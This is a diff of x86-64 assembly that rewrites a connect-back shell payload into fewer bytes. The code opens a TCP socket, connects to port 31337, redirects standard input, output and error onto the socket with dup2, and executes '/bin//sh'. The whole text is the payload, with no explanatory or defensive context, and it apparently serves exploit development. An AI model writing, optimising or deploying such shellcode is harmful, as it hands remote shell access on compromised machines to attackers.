@@ -7,45 +7,36 @@ _start:
 	movb	$0x29,%al
 	pushq	$2
 	popq	%rdi
-	pushq	$1
-	popq	%rsi
-	xorl	%edx,%edx
+	incl	%esi
 	syscall
-
 	pushq	%rax
-	popq	%rbx
-
+	popq	%rdi
 	pushq	$0
 	pushq	$0x697a0002
-
-	pushq	$0x2a
-	movl	%ebx,%edi
-	popq	%rax
-	movq	%rsp,%rsi
-	pushq	$0x10
-	popq	%rdx
+	movb	$0x2a,%al
+	pushq	%rsp
+	popq	%rsi
+	movb	$0x10,%dl
 	syscall
-
 	pushq	$2
-	popq	%rbp
+	popq	%rsi
 .L0:
-	pushq	$0x21
-	popq	%rax
-	movl	%ebx,%edi
-	movl	%ebp,%esi
+	movb	$0x21,%al
 	syscall
-	decl	%ebp
+	decl	%esi
 	jns	.L0
-
 	xorl	%eax,%eax
 	pushq	%rax
 	movq	$0x68732f2f6e69622f,%rdx
 	pushq	%rdx
-	movq	%rsp,%rdi
+	pushq	%rsp
+	popq	%rdi
 	pushq	%rax
-	movq	%rsp,%rdx
+	pushq	%rsp
+	popq	%rdx
 	pushq	%rdi
-	movq	%rsp,%rsi
+	pushq	%rsp
+	popq	%rsi
 	movb	$0x3b,%al
 	syscall
 
